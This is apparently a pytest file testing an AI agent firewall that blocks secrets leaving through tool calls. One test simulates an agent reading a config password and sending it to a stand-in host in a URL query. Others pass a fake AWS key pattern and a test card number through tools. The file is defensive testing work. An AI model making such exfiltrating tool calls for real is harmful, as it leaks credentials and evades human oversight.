"""Data leaving through tool arguments, stopped at the firewall with the real tool servers."""

import httpx2 as httpx
import pytest
from mcp import Client

from agent_firewall.policy import PolicyEngine, load
from agent_firewall.proxy.server import Upstream, build_firewall
from agent_firewall.tools import cves, email_outbox, files, web

pytestmark = pytest.mark.anyio

POLICY = """
[tools."files__read_file"]
[tools."cves__*"]

[tools."web__fetch_page"]
egress = true
copied_output = "block"

[tools."email__send_report"]
egress = true
"""

LOG = "Nov 24 02:11:03 web-1 sshd[4112]: Failed password for root from 203.0.113.9 port 51022"
PASSWORD = "Blue42Horse99Staple77Battery"


@pytest.fixture
def firewall(tmp_path):
    shared = tmp_path / "shared"
    shared.mkdir()
    (shared / "auth.log").write_bytes(LOG.encode() + b"\n")
    (shared / "app.conf").write_bytes(f"db_password={PASSWORD}\n".encode())
    fetched = []

    def site(request):
        fetched.append(str(request.url))
        return httpx.Response(200, text="ok")

    def resolve(host):
        return ["93.184.215.14"]

    policy = tmp_path / "policy.toml"
    policy.write_text(POLICY)
    server = build_firewall(
        [
            Upstream("files", files.build_server(shared)),
            Upstream("web", web.build_server(resolve, httpx.MockTransport(site))),
            Upstream(
                "cves",
                cves.build_server(httpx.MockTransport(lambda r: httpx.Response(200, json={}))),
            ),
            Upstream("email", email_outbox.build_server(tmp_path / "outbox")),
        ],
        policy=PolicyEngine(load(policy)),
    )
    server.fetched = fetched  # type: ignore[attr-defined]
    server.outbox = tmp_path / "outbox"  # type: ignore[attr-defined]
    return server


def text(result):
    return "\n".join(block.text for block in result.content)


async def test_a_password_read_from_a_file_cannot_leave_in_a_url(firewall):
    async with Client(firewall) as c:
        await c.call_tool("files__read_file", {"path": "app.conf"})
        leak = await c.call_tool(
            "web__fetch_page", {"url": f"https://example.com/collect?d={PASSWORD}"}
        )
        fine = await c.call_tool("web__fetch_page", {"url": "https://example.com/advisory"})
    assert leak.is_error and "LK03" in text(leak) and PASSWORD not in text(leak)
    assert not fine.is_error
    assert firewall.fetched == ["https://93.184.215.14/advisory"]


async def test_a_known_secret_is_blocked_even_on_a_harmless_tool(firewall):
    key = "AKIA" + "Q" * 16
    async with Client(firewall) as c:
        result = await c.call_tool(
            "cves__lookup_package", {"ecosystem": "PyPI", "name": key, "version": "1"}
        )
    assert result.is_error and "LK01" in text(result) and "AWS access key" in text(result)


async def test_card_numbers_in_a_report_need_a_person(firewall):
    async with Client(firewall) as c:
        result = await c.call_tool(
            "email__send_report",
            {"to": ["soc@example.com"], "subject": "s", "body": "card 4111 1111 1111 1111"},
        )
    assert result.is_error and "approval" in text(result) and "LK02" in text(result)
    assert not firewall.outbox.exists() or not list(firewall.outbox.iterdir())


async def test_a_summary_goes_out_but_a_pasted_log_line_needs_a_person(firewall):
    async with Client(firewall) as c:
        await c.call_tool("files__read_file", {"path": "auth.log"})
        summary = await c.call_tool(
            "email__send_report",
            {"to": ["soc@example.com"], "subject": "Night", "body": "One failed root login."},
        )
        pasted = await c.call_tool(
            "email__send_report",
            {"to": ["soc@example.com"], "subject": "Night", "body": f"Raw line: {LOG}"},
        )
    assert not summary.is_error
    assert pasted.is_error and "LK03" in text(pasted) and "approval" in text(pasted)
    assert len(list(firewall.outbox.iterdir())) == 1


async def test_failed_results_are_not_remembered(firewall):
    async with Client(firewall) as c:
        await c.call_tool("files__read_file", {"path": "missing.conf"})
        result = await c.call_tool(
            "web__fetch_page", {"url": "https://example.com/?q=Error executing tool read_file"}
        )
    assert not result.is_error
